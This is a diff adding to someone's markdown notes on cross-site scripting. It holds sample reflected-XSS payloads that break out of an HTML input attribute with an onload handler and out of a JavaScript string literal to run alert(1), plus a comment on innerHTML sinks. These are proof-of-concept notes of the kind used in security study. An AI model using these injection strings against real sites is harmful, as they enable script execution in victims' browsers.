@@ -48,6 +48,22 @@ This one escapes backend "time countdown" written in JS.
 3');alert('t
 ```
 
+```js
+foobar" onload="alert(1) //payload that reflects in the input element and has no closing quote for valid html
+// reflected source
+<input type=text placeholder='Search the blog...' name=search value="foobar onload="alert(1)">
+```
+
+```js
+// inline js script vulnerable.
+var searchTerms = 'foobar';
+// escape both single quotes and add - for execution: '-alert(1)-'
+var searchTerms = ''-alert(1)-'';
+// i was a lazy bum, this is almost like code injection i just didn't bother testing... ';alert(1); or some shit would work.
+//this worked
+foobar';alert(1);'
+```
+
 #### Reflecting user input in inner html via sink
 
 In a scenario where the front end reflects the user input in the inner html for security reasons the inline script tags will reflect but not execute.
